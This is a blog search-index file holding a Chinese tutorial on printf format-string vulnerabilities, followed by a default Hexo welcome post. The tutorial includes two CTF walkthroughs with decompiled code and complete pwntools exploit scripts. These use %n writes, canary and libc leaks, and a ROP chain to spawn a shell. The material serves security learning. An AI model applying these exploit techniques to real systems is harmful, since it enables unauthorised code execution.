<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>格式化字符串漏洞</title>
    <link href="/2023/04/08/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/"/>
    <url>/2023/04/08/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2%E6%BC%8F%E6%B4%9E/</url>
    
    <content type="html"><![CDATA[<h1 id="格式化字符串漏洞"><a href="#格式化字符串漏洞" class="headerlink" title="格式化字符串漏洞"></a>格式化字符串漏洞</h1><p>​格式化字符串漏洞是一种常见且危害比较大的漏洞，漏洞原因主要是因为类似于printf(str)这类语句，str可以由用户自己书写，如果用户通过写入设计好的语句，就会对程序里的东西进行泄露与更改，轻则使程序崩溃，重则可能会获取到shell，导致机器被人控制。</p><hr><h2 id="漏洞原理"><a href="#漏洞原理" class="headerlink" title="漏洞原理"></a>漏洞原理</h2><p>​printf函数第一个参数是字符串，被称为格式化字符串，在该字符串中可能含有%d，%s，%c等占位符，printf函数会根据这些占位符将占位符对应的位置里的内容与字符串链接起来整合成一个完整的字符串并输出。</p><p>​例如：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs C"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">char</span> demo = <span class="hljs-string">&#x27;a&#x27;</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;the char is %c\n&quot;</span>, demo);<br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>​此时，在printf函数执行时，它会将%c的值替换位a并输出，最终会输出：the char is a。</p><p>​但如果我们不给printf函数传入demo，它是否会输出呢？答案是肯定的，前面我们说了printf会将占位符对应位置的内容拿出来，所以是否你有没有给参数，它都会到站上或者寄存器中取出数据。</p><p>​不妨来看看这段代码：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-meta">#<span class="hljs-keyword">include</span> <span class="hljs-string">&lt;stdio.h&gt;</span></span><br><br><span class="hljs-type">int</span> <span class="hljs-title function_">main</span><span class="hljs-params">()</span><br>&#123;<br>    <span class="hljs-type">char</span> demo = <span class="hljs-string">&#x27;a&#x27;</span>;<br>    <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;the output is %p\n&quot;</span>); <span class="hljs-comment">//%p,以地址格式打印</span><br>    <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br></code></pre></td></tr></table></figure><p>​gdb调试界面：</p><p><img src="https://pic.imgdb.cn/item/64316d410d2dde5777d758a4.png"></p><p>​RDI中存放格式化字符串，RSI存放第二个参数对应%p，因此打印时%p替换为RSI的内容即0x7fffffffdfb8。</p><p>​按前面的解释，printf会把%p替换为%p说对应的地址的内容，最终打印为：the output is 0x7fffffffdfb8。如我们所看到的，即便我们呢没给任何参数，printf函数依然把占位符对应的内容给打印出来了，这就很容易造成栈上的信息泄露，攻击者就可以利用该漏洞获取信息甚至是控制我们的程序。</p><p>​现在我们就可以得出漏洞原理：<strong>printf函数不会对格式化字符串漏洞中的占位符是否与所给参数的数目进行检查，执行时，它只会将占位符替换为其对应的地址里的内容，并输出。</strong></p><p><strong>常见的有格式化字符串函数有（来源CTF-Wiki）：</strong></p><ul><li>输入<ul><li>scanf</li></ul></li><li>输出</li></ul><table><thead><tr><th align="center">函数</th><th align="center">基本介绍</th></tr></thead><tbody><tr><td align="center">printf</td><td align="center">输出到 stdout</td></tr><tr><td align="center">fprintf</td><td align="center">输出到指定 FILE 流</td></tr><tr><td align="center">vprintf</td><td align="center">根据参数列表格式化输出到 stdout</td></tr><tr><td align="center">vfprintf</td><td align="center">根据参数列表格式化输出到指定 FILE 流</td></tr><tr><td align="center">sprintf</td><td align="center">输出到字符串</td></tr><tr><td align="center">snprintf</td><td align="center">输出指定字节数到字符串</td></tr><tr><td align="center">vsprintf</td><td align="center">根据参数列表格式化输出到字符串</td></tr><tr><td align="center">vsnprintf</td><td align="center">根据参数列表格式化输出指定字节到字符串</td></tr><tr><td align="center">setproctitle</td><td align="center">设置 argv</td></tr><tr><td align="center">syslog</td><td align="center">输出日志</td></tr><tr><td align="center">err, verr, warn, vwarn 等</td><td align="center">。。。</td></tr></tbody></table><hr><h2 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h2><p>​格式化占位符，基本格式：</p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs C">%[parameter][flags][field width][.precision][length]type<br>    parameter：参数<br>flags：标志<br>field width：输出最小宽度<br>    precision：精度<br>    length：长度<br>    type：类型<br></code></pre></td></tr></table></figure><p>​这里我们主要学习parameter和type，其余可参考[格式化字符串](<a href="https://zh.wikipedia.org/wiki/%E6%A0%BC%E5%BC%8F%E5%8C%96%E5%AD%97%E7%AC%A6%E4%B8%B2">格式化字符串 - 维基百科，自由的百科全书 (wikipedia.org)</a>)。</p><ul><li><p>parameter</p><table><thead><tr><th align="center">字符</th><th align="center">描述</th></tr></thead><tbody><tr><td align="center">n$</td><td align="center"><em>n</em>是用这个格式说明符对指定参数做某些操作，如%5$n，向第五个位置写如前面已经打印出来的字符个数。</td></tr></tbody></table></li><li><p>type</p><table><thead><tr><th align="center">字符</th><th align="center">意义</th></tr></thead><tbody><tr><td align="center">%d</td><td align="center">以十进制形式输出带符号整数(正数不输出符号)</td></tr><tr><td align="center">%c</td><td align="center">输出单个字符</td></tr><tr><td align="center">%s</td><td align="center">输出字符串</td></tr><tr><td align="center">%p</td><td align="center"><code>void *</code>型，以地址（指针）形式输出</td></tr><tr><td align="center">%n</td><td align="center">不输出字符，但是把已经成功输出的字符个数写入对应的整型指针参数所指的变量</td></tr></tbody></table></li></ul><hr><h2 id="漏洞利用"><a href="#漏洞利用" class="headerlink" title="漏洞利用"></a>漏洞利用</h2><h3 id="一、覆盖任意地址内存"><a href="#一、覆盖任意地址内存" class="headerlink" title="一、覆盖任意地址内存"></a>一、覆盖任意地址内存</h3><p>​<a href="https://files.buuoj.cn/files/ea8c23f0f475f7e4e0d8fdb5ccb58cef/pwn">[第五空间2019 决赛]PWN5</a></p><p>​<strong>确定保护</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs C">RELRO           STACK CANARY      NX            PIE           RPATH      RUNPATH  SymbolsFORTIFYFortifiedFortifiable  FILE<br>Partial RELRO   Canary found      NX enabled    No PIE       No RPATH   No RUNPATH   No Symbols  No    <span class="hljs-number">0</span>     <span class="hljs-number">2</span>  pwn<br></code></pre></td></tr></table></figure><p>​<strong>分析程序</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> a1)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v1; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> result; <span class="hljs-comment">// eax</span><br>  <span class="hljs-type">int</span> fd; <span class="hljs-comment">// [esp+0h] [ebp-84h]</span><br>  <span class="hljs-type">char</span> nptr[<span class="hljs-number">16</span>]; <span class="hljs-comment">// [esp+4h] [ebp-80h] BYREF</span><br>  <span class="hljs-type">char</span> buf[<span class="hljs-number">100</span>]; <span class="hljs-comment">// [esp+14h] [ebp-70h] BYREF</span><br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v6; <span class="hljs-comment">// [esp+78h] [ebp-Ch]</span><br>  <span class="hljs-type">int</span> *v7; <span class="hljs-comment">// [esp+7Ch] [ebp-8h]</span><br><br>  v7 = &amp;a1;<br>  v6 = __readgsdword(<span class="hljs-number">0x14</span>u);<br>  setvbuf(<span class="hljs-built_in">stdout</span>, <span class="hljs-number">0</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>);<br>  v1 = time(<span class="hljs-number">0</span>);<br>  srand(v1);<br>  fd = open(<span class="hljs-string">&quot;/dev/urandom&quot;</span>, <span class="hljs-number">0</span>);<br>  read(fd, &amp;dword_804C044, <span class="hljs-number">4u</span>); <span class="hljs-comment">//向0x0804C044读入4个字节</span><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;your name:&quot;</span>);<br>  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x63</span>u);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;Hello,&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(buf);<span class="hljs-comment">//格式化字符串漏洞</span><br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;your passwd:&quot;</span>);<br>  read(<span class="hljs-number">0</span>, nptr, <span class="hljs-number">0xF</span>u);<br>  <span class="hljs-keyword">if</span> ( atoi(nptr) == dword_804C044 )<span class="hljs-comment">//atoi()将字符串转为数字，如：&quot;10101010&quot;转为01010101</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;ok!!&quot;</span>);<br>    system(<span class="hljs-string">&quot;/bin/sh&quot;</span>);<br>  &#125;<br>  <span class="hljs-keyword">else</span><br>  &#123;<br>    <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;fail&quot;</span>);<br>  &#125;<br>  result = <span class="hljs-number">0</span>;<br>  <span class="hljs-keyword">if</span> ( __readgsdword(<span class="hljs-number">0x14</span>u) != v6 )<br>    sub_80493D0();<br>  <span class="hljs-keyword">return</span> result;<br>&#125;<br></code></pre></td></tr></table></figure><p>​<strong>确定偏移量</strong></p><p><img src="https://pic.imgdb.cn/item/64316d830d2dde5777d7aafd.png"></p><p>​<strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 攻击思路：第一次输入，利用格式化字符串漏洞将0x0804C044连续的四个地址覆盖为想要的数，第二次输出，输入我们刚刚覆盖的数，使之执行system函数执行。</span><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br>context(arch = <span class="hljs-string">&#x27;i386&#x27;</span>, os = <span class="hljs-string">&#x27;linux&#x27;</span>, log_level = <span class="hljs-string">&#x27;debug&#x27;</span>)<br><br>p = process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>e = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause()<br><br>payload = p32(<span class="hljs-number">0x0804C044</span>) + p32(<span class="hljs-number">0x0804C045</span>) + p32(<span class="hljs-number">0x0804C046</span>) + p32(<span class="hljs-number">0x0804C047</span>)<br>payload += <span class="hljs-string">b&#x27;%10$n&#x27;</span> + <span class="hljs-string">b&#x27;%11$n&#x27;</span> + <span class="hljs-string">b&#x27;%12$n&#x27;</span> + <span class="hljs-string">b&#x27;%13$n&#x27;</span><br><br>p.recvuntil(<span class="hljs-string">b&#x27;your name:&#x27;</span>)<br>p.sendline(payload)<br><br>p.recvuntil(<span class="hljs-string">b&#x27;your passwd:&#x27;</span>)<br>p.sendline(<span class="hljs-built_in">str</span>(<span class="hljs-number">0x10101010</span>))<br><br>p.interactive()<br></code></pre></td></tr></table></figure><h3 id="二、泄露栈内存"><a href="#二、泄露栈内存" class="headerlink" title="二、泄露栈内存"></a>二、泄露栈内存</h3><p>​<strong>2023 NKCTF baby_rop</strong></p><p>​<strong>确定保护</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs c">RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH    SymbolsFORTIFYFortifiedFortifiableFILE<br>Partial RELRO   Canary found      NX enabled    No PIE          No RPATH   No RUNPATH   <span class="hljs-number">74</span> Symbols  No    <span class="hljs-number">0</span>     <span class="hljs-number">3</span>      pwn<br></code></pre></td></tr></table></figure><p>​<strong>分析程序</strong></p><figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br></pre></td><td class="code"><pre><code class="hljs c"><span class="hljs-type">int</span> __cdecl <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span><br>&#123;<br>  init(argc, argv, envp);<br>  vuln();<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;<br>&#125;<br>-----------------------------------------------------------------------------------------------------------------------------------------<br>__int64 <span class="hljs-title function_">vuln</span><span class="hljs-params">()</span><br>&#123;<br>  <span class="hljs-type">const</span> <span class="hljs-type">char</span> *format; <span class="hljs-comment">// [rsp+8h] [rbp-118h]</span><br>  <span class="hljs-type">char</span> src[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+10h] [rbp-110h] BYREF</span><br>  <span class="hljs-type">char</span> dest[<span class="hljs-number">8</span>]; <span class="hljs-comment">// [rsp+18h] [rbp-108h] BYREF</span><br>  <span class="hljs-type">char</span> v4[<span class="hljs-number">248</span>]; <span class="hljs-comment">// [rsp+20h] [rbp-100h] BYREF</span><br>  <span class="hljs-type">unsigned</span> __int64 v5; <span class="hljs-comment">// [rsp+118h] [rbp-8h]</span><br><br>  v5 = __readfsqword(<span class="hljs-number">0x28</span>u);  <span class="hljs-comment">//canary保护</span><br>  <span class="hljs-built_in">strcpy</span>(dest, <span class="hljs-string">&quot;Hello, &quot;</span>);<br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Welcome to the NKCTF message board!&quot;</span>);<br>  <span class="hljs-built_in">printf</span>(<span class="hljs-string">&quot;What is your name: &quot;</span>);<br>  my_read(src, <span class="hljs-number">8</span>);<br>  format = <span class="hljs-built_in">strcat</span>(dest, src);<br>  <span class="hljs-built_in">printf</span>(format); <span class="hljs-comment">//格式化字符串漏洞</span><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;What are your comments and suggestions for the NKCTF: &quot;</span>);<br>  my_read(v4, <span class="hljs-number">0x100</span>);<span class="hljs-comment">//栈溢出，准确来说是栈迁移</span><br>  <span class="hljs-built_in">puts</span>(<span class="hljs-string">&quot;Thank you, we will read your comments and suggestions carefully.&quot;</span>);<br>  <span class="hljs-keyword">return</span> <span class="hljs-number">0LL</span>;<br>&#125;<br>-----------------------------------------------------------------------------------------------------------------------------------------<br>    __int64 __fastcall <span class="hljs-title function_">my_read</span><span class="hljs-params">(__int64 a1, <span class="hljs-type">int</span> a2)</span><br>&#123;<br>  <span class="hljs-type">unsigned</span> <span class="hljs-type">int</span> v3; <span class="hljs-comment">// [rsp+18h] [rbp-8h]</span><br>  <span class="hljs-type">int</span> i; <span class="hljs-comment">// [rsp+1Ch] [rbp-4h]</span><br><br>  <span class="hljs-keyword">for</span> ( i = <span class="hljs-number">0</span>; i &lt; a2; ++i )<br>  &#123;<br>    v3 = read(<span class="hljs-number">0</span>, (i + a1), <span class="hljs-number">1uLL</span>);<br>    <span class="hljs-keyword">if</span> ( *(i + a1) == <span class="hljs-string">&#x27;\n&#x27;</span> )<br>      <span class="hljs-keyword">break</span>;<br>  &#125;<br>  *(i + a1) = <span class="hljs-number">0</span>;<span class="hljs-comment">//执行完my_read之后 将rbp最后一个字节清零 如：rbp：0x7ffd1c9f2ce0 -&gt; rbp：0x7ffd1c9f2c00</span><br>  <span class="hljs-keyword">return</span> v3;<br>&#125;<br></code></pre></td></tr></table></figure><p>​<strong>栈迁移</strong></p><p><img src="https://pic.imgdb.cn/item/64316d410d2dde5777d758a4.png"></p><p>​两次leave_ret明显是栈迁移起手式</p><p>​<strong>exp</strong></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 攻击思路：首先泄露canary值；然后，泄露libc地址；最后，构造rop链，拿到shell。</span><br><span class="hljs-comment"># libc database search:https://libc.blukat.me/</span><br><span class="hljs-comment"># 查找本机libc版本：strings /lib/x86_64-linux-gnu/libc.so.6 |grep version</span><br><br><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *<br><br>context.arch = <span class="hljs-string">&#x27;amd64&#x27;</span><br>context.os = <span class="hljs-string">&#x27;linux&#x27;</span><br><span class="hljs-comment"># context.log_level(value=&#x27;debug&#x27;)</span><br><br>p =process(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>e = ELF(<span class="hljs-string">&#x27;./pwn&#x27;</span>)<br>libc = ELF(<span class="hljs-string">&#x27;/lib/x86_64-linux-gnu/libc.so.6&#x27;</span>)<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">debug</span>():<br>    gdb.attach(p)<br>    pause()<br><br><span class="hljs-comment"># 泄露canary值</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">leak_canary</span>():<br>    <span class="hljs-built_in">format</span> = <span class="hljs-string">b&#x27;%41$p\n&#x27;</span><br>    p.sendafter(<span class="hljs-string">b&#x27;name: &#x27;</span>,<span class="hljs-built_in">format</span>)<br>    p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>    canary = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">16</span>),<span class="hljs-number">16</span>)<br>    log.info(<span class="hljs-built_in">hex</span>(canary))<br>    <span class="hljs-keyword">return</span> canary<br><br><span class="hljs-comment"># 泄露libc地址</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">get_base</span>():<br>    <span class="hljs-built_in">format</span> = <span class="hljs-string">b&#x27;%25$p\n&#x27;</span><br>    p.sendafter(<span class="hljs-string">b&#x27;name: &#x27;</span>,<span class="hljs-built_in">format</span>)<br>    p.recvuntil(<span class="hljs-string">b&#x27;0x&#x27;</span>)<br>    addr = <span class="hljs-built_in">int</span>(p.recv(<span class="hljs-number">12</span>),<span class="hljs-number">16</span>)<br>    base = addr - <span class="hljs-number">0x001f7680</span><br>    <span class="hljs-keyword">return</span> base<br><br><br>ret_addr = <span class="hljs-number">0x0040101a</span><br>main_adr = <span class="hljs-number">0x004010F0</span><br>pop_rdi  = <span class="hljs-number">0x00401413</span><br>canary   = leak_canary()<br><br>debug()<br>payload = p64(ret_addr)*<span class="hljs-number">30</span> + p64(main_adr) + p64(canary)<br>p.sendafter(<span class="hljs-string">b&quot;the NKCTF: \n&quot;</span>, payload)<br><br>base   = get_base()<br>system = base + libc.symbols[<span class="hljs-string">&#x27;system&#x27;</span>]<br>binsh  = base + <span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&#x27;/bin/sh&#x27;</span>))<br><br>payload = p64(ret_addr)*<span class="hljs-number">28</span> + p64(pop_rdi) + p64(binsh) + p64(system) + p64(canary)<br>p.sendafter(<span class="hljs-string">b&quot;the NKCTF: \n&quot;</span>, payload)<br>p.interactive()<br><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>PWN学习笔记</category>
      
    </categories>
    
    
    <tags>
      
      <tag>pwn</tag>
      
      <tag>漏洞</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>Hello World</title>
    <link href="/2023/04/08/hello-world/"/>
    <url>/2023/04/08/hello-world/</url>
    
    <content type="html"><![CDATA[<p>Welcome to <a href="https://hexo.io/">Hexo</a>! This is your very first post. Check <a href="https://hexo.io/docs/">documentation</a> for more info. If you get any problems when using Hexo, you can find the answer in <a href="https://hexo.io/docs/troubleshooting.html">troubleshooting</a> or you can ask me on <a href="https://github.com/hexojs/hexo/issues">GitHub</a>.</p><h2 id="Quick-Start"><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2><h3 id="Create-a-new-post"><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo new <span class="hljs-string">&quot;My New Post&quot;</span><br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/writing.html">Writing</a></p><h3 id="Run-server"><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo server<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/server.html">Server</a></p><h3 id="Generate-static-files"><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo generate<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/generating.html">Generating</a></p><h3 id="Deploy-to-remote-sites"><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs bash">$ hexo deploy<br></code></pre></td></tr></table></figure><p>More info: <a href="https://hexo.io/docs/one-command-deployment.html">Deployment</a></p>]]></content>
    
    
    
  </entry>
  
  
  
  
</search>
